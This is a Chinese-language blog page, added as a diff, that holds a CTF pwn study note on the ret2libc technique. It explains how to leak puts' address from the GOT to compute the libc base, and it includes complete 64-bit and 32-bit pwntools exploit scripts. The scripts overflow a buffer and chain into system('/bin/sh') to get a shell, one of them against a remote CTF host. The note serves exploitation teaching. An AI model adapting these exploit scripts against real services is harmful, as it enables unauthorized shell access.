@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>ret2libc - GuQing&#39;s Blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.jpg">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  <meta name="description" content="题目要想实现ret2libc，有以下几个必要条件：  存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。 另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2libc">
+<meta property="og:url" content="http://example.com/2025/12/30/ret2libc/index.html">
+<meta property="og:site_name" content="GuQing&#39;s Blog">
+<meta property="og:description" content="题目要想实现ret2libc，有以下几个必要条件：  存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。 存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。 另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-30T03:01:46.904Z">
+<meta property="article:author" content="GuQing">
+<meta property="article:tag" content="Note_For_Pwn">
+<meta name="twitter:card" content="summary">
+
+  <link rel="preconnect" href="https://rsms.me/">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@15/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/carousel.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+
+  
+
+  
+<script src="/js/head.js"></script>
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+    data-nav-blur-gradient="false"
+    data-corner-squircle="true"
+  >
+    
+<script src="/js/body-top.js"></script>
+
+    <a href="#main-content" id="skip-to-content">跳至主要内容</a>
+    
+
+<nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">GuQing&#39;s Blog</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">主页</a>
+
+      
+      <a class="nav-item" href="/About-Me" style="--index: 1">关于我</a>
+      
+      <a class="nav-item" href="/archives" style="--index: 2">归档</a>
+      
+      <a class="nav-item" href="/tags" style="--index: 3">标签</a>
+      
+      <a class="nav-item" href="/categories" style="--index: 4">分类</a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content" data-pagefind-body>
+      
+<article class="post">
+  
+  <div class="meta">
+    
+    <div class="categories text-uppercase">
+    
+      <a href="/categories/Notes/">Notes</a>
+    
+    </div>
+    
+
+    
+    <time class="date" datetime="2025-12-30T00:00:00+08:00">
+      2025-12-30
+    </time>
+    
+
+    <h1 class="title" data-pagefind-meta="title">ret2libc</h1>
+  </div>
+
+  <div class="content">
+    <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>要想实现ret2libc，有以下几个必要条件：</p>
+<ol>
+<li>存在溢出，且溢出范围足够大，可以覆盖到main函数的返回地址，还可以覆盖更远的区域。</li>
+<li>存在类似于puts，write这样的打印函数。可以被利用，劫持程序的执行流程后，执行puts,write这样的函数打印一些已经执行过的函数的真实地址，以便我们寻找libc的基地址。<br> 另外这类题目往往还有以下的特点，暗示我们要可能要使用ret2libc的方法：</li>
+<li>开启了NX保护，即数据段不可执行。同时栈也是不可执行的。因此就别想通过写入shellcode再ret2shellcode这样的方法拿shell。</li>
+<li>程序本身也没有像system(“&#x2F;bin&#x2F;sh”)这样直接的后门函数，因此我们也不要想着直接ret2text这么直接。</li>
+<li>程序中可能既没有system函数，又没有”&#x2F;bin&#x2F;sh”字符串，需要我们在libc库中寻找。</li>
+</ol>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>我们的目标是拿到shell，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。拆分这个目标，可以分为以下两个步骤：</p>
+<ol>
+<li>找到system()函数和&#x2F;bin&#x2F;sh字符串在libc中的地址。</li>
+<li>劫持程序的执行流程，让程序执行system(“&#x2F;bin&#x2F;sh”)。<br>实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和”&#x2F;bin&#x2F;sh”字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和”&#x2F;bin&#x2F;sh”字符串呢？这里需要用到以下公式：<br><code>函数的真实地址   =   基地址   +   偏移地址 </code><br>要牢牢记住我们的目标：找到system()函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。下面我们对这个公式做一个解释：<br>偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、”&#x2F;bin&#x2F;sh”字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、”&#x2F;bin&#x2F;sh”字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。<br>基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，用公式：<br>这次运行程序的基地址 &#x3D; 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址<br>即可求出这次运行的基地址。<br> 这回问题又发生了转化：如何找到某个函数func的真实地址呢？<br>像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。<br>总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数&#x2F;write函数的真实地址。</li>
+</ol>
+<p>整体思路总结（关键）：</p>
+<ol>
+<li><p>首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。</p>
+</li>
+<li><p>找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。</p>
+</li>
+<li><p>根据libc库的版本可以很容易的确定puts函数的偏移地址。</p>
+</li>
+<li><p>计算基地址。基地址 &#x3D; puts函数的真实地址 - puts函数的偏移地址。</p>
+</li>
+<li><p>根据libc函数的版本，很容易确定system函数和”&#x2F;bin&#x2F;sh”字符串在libc库中的偏移地址。 </p>
+</li>
+<li><p>根据 真实地址 &#x3D; 基地址 + 偏移地址 计算出system函数和”&#x2F;bin&#x2F;sh”字符串的真实地址。</p>
+</li>
+<li><p>再次构造合理的payload2，劫持程序的执行流程，劫持到system(“&#x2F;bin&#x2F;sh”)的真实地址，从而拿到shell。</p>
+</li>
+</ol>
+<p>以上取自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403?spm=1001.2014.3001.5502">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）-CSDN博客</a></p>
+<h1 id="64位脚本"><a href="#64位脚本" class="headerlink" title="64位脚本"></a>64位脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">40393</span>)</span><br><span class="line">rdi = <span class="number">0x40119E</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">72</span> + p64(rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input something: &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_puts = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_puts: &quot;</span>, <span class="built_in">hex</span>(leak_puts))</span><br><span class="line">libc_base = leak_puts - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base: &quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_addr)))</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">72</span></span><br><span class="line">payload += p64(rdi +<span class="number">1</span>)</span><br><span class="line">payload += p64(rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input something: &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="32位脚本"><a href="#32位脚本" class="headerlink" title="32位脚本"></a>32位脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) <span class="comment">#确定libc库并解析</span></span><br><span class="line">p = process(<span class="string">&quot;./ret2libc3_32&quot;</span>)</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#puts函数的入口地址</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]  <span class="comment">#puts函数的got表地址</span></span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>] <span class="comment">#程序的起始地址</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(puts_plt) + p32(start_addr) + p32(puts_got)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload1)</span><br><span class="line">puts_real_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])  <span class="comment">#接收puts的真实地址，占4个字节</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt:&#123;&#125;, puts_got: &#123;&#125;, start_addr: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt),<span class="built_in">hex</span>(puts_got), <span class="built_in">hex</span>(start_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_real_addr: &quot;</span>, <span class="built_in">hex</span>(puts_real_addr)) </span><br><span class="line">libc_addr = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>] <span class="comment">#计算libc库的基地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&quot;system&quot;</span>] <span class="comment">#计算system函数的真实地址</span></span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))  <span class="comment">#计算binsh字符串的真实地址</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">112</span> + p32(system_addr) + <span class="string">b&quot;aaaa&quot;</span> + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+
+  
+  <div class="about" data-pagefind-ignore>
+    <h2>关于本文</h2>
+    <div class="details">
+      <p>由 GuQing 撰写，采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a> 许可协议。</p>
+    </div>
+    
+    <p class="tags">
+      <i class="bi bi-tags icon"></i>
+      
+      <a href="/tags/Note-For-Pwn/" class="tag">#Note_For_Pwn</a>
+      
+    </p>
+    
+    
+  </div>
+  
+
+  <div class="container post-prev-next" data-pagefind-ignore>
+    <a class="next"></a>
+    
+    <a href="/2025/12/27/%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA/" class="prev">
+      <div class="text">
+        <p class="label">上一篇</p>
+        <h3 class="title">简单栈溢出</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">主页</a>
+        
+        <a href="/About-Me" class="item">关于我</a>
+        
+        <a href="/archives" class="item">归档</a>
+        
+        <a href="/tags" class="item">标签</a>
+        
+        <a href="/categories" class="item">分类</a>
+        
+        <a href="/search" class="item">搜索</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Related</h2>
+        
+        <a target="_blank" rel="noopener" href="https://hexo.io/" class="item">Hexo</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2025 GuQing<br>由 <a href="http://hexo.io/" target="_blank">Hexo</a> 驱动</span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>浅色</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>深色</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>自动</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
